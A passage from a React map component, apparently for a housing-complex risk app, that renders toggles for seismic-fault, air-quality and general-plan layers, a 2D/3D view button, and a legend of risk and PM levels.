      map.setPaintProperty("complexes-circles", "circle-stroke-width", [
        "case",
        ["==", ["get", "id"], hoveredComplexId], 4,
        COMPLEX_STROKE_WIDTH,
      ]);
      map.setPaintProperty("complexes-circles", "circle-stroke-color", [
        "case",
        ["==", ["get", "id"], hoveredComplexId], "#3b82f6",
        COMPLEX_STROKE_COLOR,
      ]);
    } else {
      map.setPaintProperty("complexes-circles", "circle-stroke-width", COMPLEX_STROKE_WIDTH);
      map.setPaintProperty("complexes-circles", "circle-stroke-color", COMPLEX_STROKE_COLOR);
    }
  }, [hoveredComplexId]);

  // Key-feature layers follow their toggles. Before the load handler has
  // added the layers there is nothing to set; it applies layersRef then.
  useEffect(() => {
    const map = mapRef.current;
    if (!map) return;
    setLayersVisible(map, SEISMIC_LAYERS, showFaults);
    setLayersVisible(map, AIR_LAYERS, showAirQuality);
    setLayersVisible(map, GENPLAN_LAYERS, showGenplanDetailed);
  }, [showFaults, showAirQuality, showGenplanDetailed]);

  // Markers follow the page's filters and the «Новостройки» toggle.
  useEffect(() => {
    const map = mapRef.current;
    if (!map) return;
    for (const id of COMPLEX_LAYERS) {
      if (map.getLayer(id)) map.setFilter(id, markerFilter);
    }
  }, [markerFilter]);

  return (
    <div className="relative w-full h-full">
      <div ref={mapContainer} className="w-full h-full" />

      {/* Key features, always on screen: three layers and the two stage
          filters («Строящиеся», «Новостройки»). Wraps on phones; the
          right margin keeps clear of the zoom/compass control. */}
      <div className="absolute top-2 left-2 right-12 sm:top-3 sm:left-3 z-10 flex flex-wrap gap-1.5">
        <FeatureToggle
          active={showFaults}
          onToggle={() => setShowFaults((v) => !v)}
          icon={Activity}
          label={t("map.featureSeismic")}
          title={t("map.featureSeismicHint")}
          activeClass="bg-red-600 hover:bg-red-700"
          iconClass="text-red-600"
        />
        <FeatureToggle
          active={showAirQuality}
          onToggle={() => setShowAirQuality((v) => !v)}
          icon={Wind}
          label={t("map.featureAir")}
          title={t("map.airQuality")}
          activeClass="bg-emerald-600 hover:bg-emerald-700"
          iconClass="text-emerald-600"
        />
        {underConstructionCount > 0 && (
          <FeatureToggle
            active={stages.includes("building")}
            onToggle={() => toggleStage("building")}
            icon={Construction}
            label={t("map.featureBuilding")}
            title={t("map.featureBuildingHint")}
            count={underConstructionCount}
            activeClass="bg-sky-600 hover:bg-sky-700"
            iconClass="text-sky-600"
          />
        )}
        {newBuildingCount > 0 && (
          <FeatureToggle
            active={stages.includes("new")}
            onToggle={() => toggleStage("new")}
            icon={House}
            label={t("map.featureNew")}
            title={t("map.featureNewHint", { year: newBuildingSince() })}
            count={newBuildingCount}
            activeClass="bg-violet-600 hover:bg-violet-700"
            iconClass="text-violet-600"
          />
        )}
        {hasGenplan && (
          <FeatureToggle
            active={showGenplanDetailed}
            onToggle={() => setShowGenplanDetailed((v) => !v)}
            icon={LandPlot}
            label={t("map.featureGenplan")}
            title={t("map.genplanDetailed")}
            activeClass="bg-teal-600 hover:bg-teal-700"
            iconClass="text-teal-600"
          />
        )}
      </div>

      {/* View-mode toggle — вид сверху (по умолчанию) ↔ объёмный.
          Bottom-right, above the attribution; sized for thumb tap on
          mobile. Label shows the view you'll switch TO. */}
      <button
        type="button"
        onClick={() => {
          const map = mapRef.current;
          const next = !view3dRef.current;
          view3dRef.current = next;
          setView3d(next);
          map?.easeTo({
            pitch: next ? 60 : 0,
            bearing: next ? -10 : 0,
            duration: 600,
          });
        }}
        title={view3d ? t("map.view2d") : t("map.view3d")}
        className="absolute bottom-9 right-2 sm:bottom-10 sm:right-3 z-10 flex items-center gap-1.5 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg px-2.5 py-2 hover:bg-muted transition-colors"
      >
        <span className="text-[11px] font-bold w-5 text-center">{view3d ? "2D" : "3D"}</span>
        <span className="hidden sm:inline text-xs font-medium">
          {view3d ? t("map.view2d") : t("map.view3d")}
        </span>
      </button>

      {/* Compact legend */}
      <div className="absolute bottom-2 left-2 sm:bottom-3 sm:left-3 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg p-2 sm:p-2.5 text-[9px] sm:text-[10px] space-y-0.5 sm:space-y-1 z-10">
        {/* Marker shape legend — explains the two visual languages on the
            map (solid circle = ЖК, ring = AirKaz station). Without this
            the donut markers blend in as "weirdly drawn ЖК". */}
        <div className="space-y-0.5 pb-1 mb-1 border-b">
          <div className="flex items-center gap-1.5">
            <span className="w-2.5 h-2.5 rounded-full bg-muted-foreground" />
            {t("map.markerComplex")}
          </div>
          {underConstructionCount > 0 && (
            <div className="flex items-center gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-muted-foreground ring-2 ring-sky-600" />
              {t("map.markerUnderConstruction")} ({underConstructionCount})
            </div>
          )}
          {showAirQuality && (
            <div className="flex items-center gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-muted-foreground" />
              {t("map.markerStation")}
            </div>
          )}
        </div>

        <div className="font-medium text-[10px]">{t("map.legend")}</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-green-500" />{t("map.legendSafe")} ({riskCounts.safe})</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-yellow-500" />{t("map.legendModerate")} ({riskCounts.moderate})</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-orange-500" />{t("map.legendHigh")} ({riskCounts.high})</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-red-600" />{t("map.legendCritical")} ({riskCounts.critical})</div>
        {showFaults && (
          <div className="border-t pt-1 mt-1 space-y-0.5">
            <div className="flex items-center gap-1.5"><span className="w-3 h-px bg-red-600" />{t("map.faultLabel")}</div>
          </div>
        )}
        {showGenplanDetailed && (
          <div className="border-t pt-1 mt-1">
            <div className="font-medium text-[10px]">{t("map.genplanDetailed")}</div>
            <div className="text-[9px] text-muted-foreground leading-snug">
              {t("map.genplanDetailedCredit")}
            </div>
          </div>
        )}
        {showAirQuality && (
          <div className="border-t pt-1 mt-1 space-y-0.5">
            <div className="font-medium text-[10px]">
              {t("map.pmTitle")}
              {data.airStations && (
                <span className="text-muted-foreground font-normal ml-1">
                  · {t("map.pmStations", { count: data.airStations.length })}
                </span>
              )}
            </div>
            {(!data.airStations || data.airStations.length < MIN_STATIONS_FOR_HEATMAP) && (
              <div className="text-[10px] text-muted-foreground max-w-44">
                {t("map.pmSparse")}
              </div>
            )}
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-green-500" />{t("map.pmGood")}</div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-yellow-500" />{t("map.pmModerate")}</div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-orange-500" />{t("map.pmSensitive")}</div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-red-600" />{t("map.pmUnhealthy")}</div>
          </div>
        )}
      </div>
    </div>
  );
}
